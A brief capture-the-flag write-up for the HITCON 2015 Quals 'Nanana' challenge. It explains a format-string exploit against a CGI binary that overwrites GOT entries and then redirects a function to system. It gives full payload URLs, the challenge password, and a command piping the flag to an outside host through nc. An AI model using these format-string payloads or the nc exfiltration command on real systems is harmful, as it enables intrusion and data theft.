---
layout: post
title: "HITCON 2015 Quals: Nanana"
modified: 2015-10-19
tags: hitcon hitcon2015quals
---
*This challenge was solved by and the write up was written by one of my teammates, vek.*

First, we got the correct password by changing the GOT of strlen into puts using a format string vuln, so that puts(password) got called. We did that with the following input:
{% highlight text %}
http://54.92.88.102/cgi-bin/nanana?action=%2507hhx%2515%24hhn%25057hhx%2517%24hhn%25064hhx%2521%24hhn&username=0%10%60&password=2%10%60&job=1%10%60
{% endhighlight %}

With the password ("hitconctf2015givemeshell"), we could trigger a function whose first parameter we controlled ( do_job(username) ), so all we had to do was to change do_job's address to system and username to the desired command, e.g

{% highlight text %}
http://54.92.88.102/cgi-bin/nanana?action=%250192hhx%2515%24hhn&username=%2Fread_flag|nc%20X.X.X.X%2025565&password=hitconctf2015givemeshell&job=H%10%6>
{% endhighlight %}